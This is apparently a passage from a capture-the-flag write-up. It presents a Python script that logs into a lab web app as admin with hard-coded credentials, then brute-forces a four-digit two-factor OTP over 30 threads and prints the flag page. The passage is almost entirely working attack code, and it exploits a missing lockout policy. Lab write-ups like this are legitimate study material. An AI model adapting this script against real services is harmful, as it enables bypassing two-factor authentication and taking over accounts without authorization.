We can also write a brute force script as follows if the otp is not revealed in the session cookie:

The below script is made using AI. It grabs the session cookie after login and uses threads to brute force the OTPs since there is no lockout policy as far as we can interpret from the app.py code.

import requests
import concurrent.futures
import threading

BASE_URL = "http://xebec.cylabacademy.net:32518"

# ---- Step 1: Log in ONCE, capture the session cookie ----
print("[*] Logging in as admin...")
s = requests.Session()
r = s.post(f"{BASE_URL}/login", data={
    "username": "admin",
    "password": "apple@123"
}, allow_redirects=False, timeout=10)

cookie = s.cookies.get("session")
print(f"[*] Login status: {r.status_code}")
print(f"[*] Captured session cookie: {cookie}")

if not cookie:
    print("[-] No session cookie captured — check login response.")
    print("--- response body ---")
    print(r.text[:500])
    raise SystemExit(1)

# ---- Step 2: Brute-force with that cookie ----
print("[*] Brute-forcing OTP with captured cookie...")

found_flag = False
found_otp = None
found_lock = threading.Lock()
print_lock = threading.Lock()
tried = 0
tried_lock = threading.Lock()


def test_otp(code):
    global found_flag, found_otp, tried

    with found_lock:
        if found_flag:
            return None

    otp = str(code)
    try:
        res = requests.post(
            f"{BASE_URL}/two_fa",
            data={"otp": otp},
            cookies={"session": cookie},
            allow_redirects=False,
            timeout=5,
        )

        if res.status_code == 302:
            with found_lock:
                if found_flag:
                    return None
                found_flag = True
                found_otp = otp

            with print_lock:
                print(f"\n[+] SUCCESS! Correct OTP found: {otp}")

            new_cookie = res.cookies.get("session") or cookie
            home = requests.get(
                f"{BASE_URL}/",
                cookies={"session": new_cookie},
                timeout=10,
            )
            with print_lock:
                print("\n--- FLAG RESPONSE ---")
                print(home.text)
            return otp

        with tried_lock:
            tried += 1
            n = tried
        with print_lock:
            if n % 100 == 0:
                print(f"[*] {n} OTPs tried, still searching...")
        return None

    except Exception:
        with tried_lock:
            tried += 1
        return None


executor = concurrent.futures.ThreadPoolExecutor(max_workers=30)
try:
    futures = [executor.submit(test_otp, code) for code in range(1000, 10000)]
    for f in concurrent.futures.as_completed(futures):
        if f.result():
            executor.shutdown(wait=False, cancel_futures=True)
            break
finally:
    executor.shutdown(wait=False, cancel_futures=True)

print("\n========== SUMMARY ==========")
if found_otp:
    print(f"[+] Correct OTP: {found_otp}")
else:
    print(f"[-] No OTP worked. Total tried: {tried}")
